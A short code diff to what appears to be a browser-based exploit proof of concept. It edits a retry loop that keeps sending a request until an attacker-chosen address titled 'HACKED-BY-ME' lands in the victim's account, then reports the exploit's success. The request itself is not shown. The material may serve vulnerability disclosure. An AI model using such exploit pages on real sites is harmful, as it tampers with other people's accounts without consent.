@@ -76,22 +76,20 @@
                     if (response.ok) {
                         const data = await response.json();
                         resultDiv.innerHTML = '✅ EXPLOIT SUCCESSFUL!<br><br>' +
-                                            'The address with title "HACKED-BY-ME" has been added to your addresses.<br><br>' +
-                                            'Response from server:<br><br>' + 
-                                            JSON.stringify(data, null, 2);
+                                            'The address with title "HACKED-BY-ME" has been added to your addresses.<br><br>';
+                                            
                         resultDiv.style.color = 'red';
                         resultDiv.style.fontWeight = 'bold';
                         
-                        // Show response body in alert popup
+                       
                         alert(JSON.stringify(data, null, 2));
-                        break; // Stop when successful
+                        break; 
                     }
                 } catch (error) {
-                    // Continue trying on error
+                
                     resultDiv.innerHTML = 'Trying...';
                 }
                 
-                // Wait 0.2 seconds before next request
                 await new Promise(resolve => setTimeout(resolve, 200));
             }
         }
